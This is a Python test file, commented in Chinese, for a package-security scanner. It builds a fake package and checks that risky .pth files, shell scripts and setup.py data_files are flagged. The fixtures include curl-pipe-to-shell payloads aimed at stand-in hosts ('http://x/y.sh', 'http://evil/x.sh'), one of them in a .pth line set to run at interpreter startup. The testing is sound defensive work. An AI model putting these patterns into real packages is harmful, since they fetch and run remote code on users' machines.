# -*- coding: utf-8 -*-
"""工件扫描测试（2026-11 跨工件缺口）

DDG 只解析 .py，所以 .pth / .sh / data_files 在图上没有节点。
这里验证图外证据能被确定性地提取和判定。
"""
import shutil
import sys
import tempfile
from pathlib import Path

NEW_DDG = Path(__file__).parent.parent
sys.path.insert(0, str(NEW_DDG))

from src.artifact_scanner import scan_artifacts, risk_findings, render_for_prompt

PASS = FAIL = 0


def check(name, cond, detail=''):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  ✓ {name}")
    else:
        FAIL += 1
        print(f"  ✗ {name}  {detail}")


def _make_pkg(root: Path) -> Path:
    pkg = root / 'pkg'
    (pkg / 'mypkg').mkdir(parents=True)
    (pkg / 'mypkg' / '__init__.py').write_text("", encoding='utf-8')
    (pkg / 'mypkg' / 'core.py').write_text("def f():\n    return 1\n",
                                           encoding='utf-8')
    (pkg / 'setup.py').write_text(
        "from setuptools import setup\n"
        "setup(\n"
        "    name='mypkg',\n"
        "    data_files=[('Lib/site-packages', ['data/evil.pth'])],\n"
        ")\n", encoding='utf-8')
    (pkg / 'pyproject.toml').write_text(
        "[build-system]\n"
        "requires = [\"setuptools>=61\"]\n"
        "build-backend = \"setuptools.build_meta\"\n", encoding='utf-8')
    (pkg / 'MANIFEST.in').write_text("include data/*.pth\n", encoding='utf-8')
    (pkg / 'data').mkdir()
    (pkg / 'data' / 'evil.pth').write_text(
        "import os; os.system('curl http://x/y.sh | sh')\n", encoding='utf-8')
    (pkg / 'safe.pth').write_text("./lib\n./vendor\n", encoding='utf-8')
    (pkg / 'install.sh').write_text(
        "#!/bin/sh\ncurl -s http://evil/x.sh | sh\n", encoding='utf-8')
    (pkg / 'blob.bin').write_bytes(b'\x00\x01\x02' * 100)
    return pkg


print("[1] 扫描与判定")
root = Path(tempfile.mkdtemp(prefix='artifact_'))
try:
    pkg = _make_pkg(root)
    art = scan_artifacts(pkg)

    check("识别 .pth 执行行", len(art['pth_exec']) == 1,
          detail=str(art['pth_exec']))
    check("安全 .pth 不产生执行行",
          all('safe.pth' not in d['file'] for d in art['pth_exec']))
    check("危险 .pth 被标记", len(art['pth_dangerous']) == 1,
          detail=str(len(art['pth_dangerous'])))
    check("危险能力词被记录",
          'os.system' in art['pth_dangerous'][0]['hits'])

    check("shell 载荷被识别", len(art['shell_findings']) == 1,
          detail=str(art['shell_findings']))
    check("curl|sh 形态名正确",
          art['shell_findings'][0]['patterns'][0]['pattern'] == 'curl_pipe_shell')

    check("解析 build-backend",
          any('build-backend' in x for x in
              (art['build_config'].get('lines') or [])),
          detail=str(art['build_config']))

    check("data_files 引用被抽出",
          any(r['to'] == 'data/evil.pth' for r in art['references']),
          detail=str(art['references']))
    check("引用来源是 setup.py",
          any(r['from'] == 'setup.py' for r in art['references']))

    check("工件清单含非 .py",
          any(a['file'].endswith('.pth') for a in art['artifacts']))
    check("工件清单不含 .py",
          all(not a['file'].endswith('.py') for a in art['artifacts']))

    # --- findings ---
    findings = risk_findings(art)
    types = {f['type'] for f in findings}
    check("产出 pth_execution", 'pth_execution' in types, detail=str(types))
    check("pth_execution 是 critical",
          any(f['severity'] == 'critical' for f in findings
              if f['type'] == 'pth_execution'))
    check("产出 artifact_shell", 'artifact_shell' in types, detail=str(types))
    check("curl|sh 判 critical",
          any(f['severity'] == 'critical' for f in findings
              if f['type'] == 'artifact_shell'))
    check("data_files 落地 .pth 被标记",
          any(f['type'] == 'artifact_install_payload' for f in findings),
          detail=str(types))
    check("finding 带 file/reason",
          all(f.get('file') is not None and f.get('reason') for f in findings))

    # --- 渲染 ---
    txt = render_for_prompt(art)
    check("渲染含工件段标题", 'PACKAGE ARTIFACTS' in txt, detail=txt[:120])
    check("渲染标出执行行", 'EXECUTES AT INTERPRETER STARTUP' in txt)
    check("渲染含 references", 'references:' in txt)
    check("渲染含图外提示", 'NOT in the dependency graph' in txt)
    check("渲染有长度上限", len(render_for_prompt(art, max_chars=200)) <= 260,
          detail=str(len(render_for_prompt(art, max_chars=200))))

    # --- 边界 ---
    empty = scan_artifacts(root / 'nonexistent')
    check("不存在的目录安全", empty['artifacts'] == [] and empty['pth_exec'] == [])

    clean_dir = root / 'clean'
    (clean_dir / 'pkg').mkdir(parents=True)
    (clean_dir / 'pkg' / 'a.py').write_text("x=1\n", encoding='utf-8')
    clean = scan_artifacts(clean_dir / 'pkg')
    check("干净包无 findings", risk_findings(clean) == [])
    check("干净包渲染为空", render_for_prompt(clean) == '')

    binart = scan_artifacts(root)   # 含 blob.bin，不应崩
    check("二进制文件不崩", isinstance(binart, dict))
finally:
    shutil.rmtree(root, ignore_errors=True)


print("[2] enhanced_detector 接线")
try:
    from src.enhanced_detector import EnhancedSecurityDetector
    root2 = Path(tempfile.mkdtemp(prefix='artifact2_'))
    try:
        pkg2 = _make_pkg(root2)
        det = EnhancedSecurityDetector()
        rep = det.analyze_package(pkg2, dist_name='mypkg-1.0')
        art_rep = rep.get('artifact_analysis') or {}
        check("报告含 artifact_analysis", 'artifact_analysis' in rep)
        check("has_threats=True", art_rep.get('has_threats') is True,
              detail=str(art_rep.get('threat_level')))
        check("threat_level=critical", art_rep.get('threat_level') == 'critical',
              detail=str(art_rep.get('threat_level')))
        check("威胁汇总包含 pth_execution",
              any(t.get('type') == 'pth_execution'
                  for t in rep.get('threats_found', [])))
        check("总体等级被拉高",
              rep.get('overall_threat_level') in ('critical', 'high'),
              detail=str(rep.get('overall_threat_level')))
    finally:
        shutil.rmtree(root2, ignore_errors=True)
except Exception as e:
    check("enhanced_detector 可导入", False, detail=repr(e))


print()
print(f"工件扫描: PASS={PASS} FAIL={FAIL}")
sys.exit(1 if FAIL else 0)
